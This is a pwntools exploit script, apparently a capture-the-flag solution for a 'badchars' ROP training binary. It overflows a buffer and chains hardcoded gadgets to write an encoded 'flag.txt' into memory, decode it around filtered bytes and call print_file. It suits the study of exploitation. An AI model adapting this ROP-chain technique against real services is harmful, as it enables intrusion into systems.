from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme + 268
continue
'''.format(**locals())

exe = './badchars'
elf = context.binary = ELF(exe, checksec=False)
p = start()

pop_12_13_14_15 = 0x000000000040069c
mov_13_12 = 0x0000000000400634
ret = 0x00000000004004ee
pop_rdi = 0x00000000004006a3
pop_r14_r15 = 0x00000000004006a0
add_r15_r14b = 0x000000000040062c
pos = elf.bss() + 0x100

def decflag(flag):
    res = [x - 1 for x in flag]
    return bytes(res)

# ===== Exploit script here =====
payload =  b'A'*40
payload += p64(pop_12_13_14_15)
payload += decflag(b'flag.txt')
payload += p64(pos) + p64(0) + p64(0) + p64(mov_13_12)

for i in range(8):
    payload += p64(pop_r14_r15) + b'\x01'*8 + p64(pos + i) + p64(add_r15_r14b)

payload += p64(pop_rdi) + p64(pos) + p64(ret) + p64(elf.plt['print_file'])
p.sendlineafter(b'> ', payload)
p.interactive()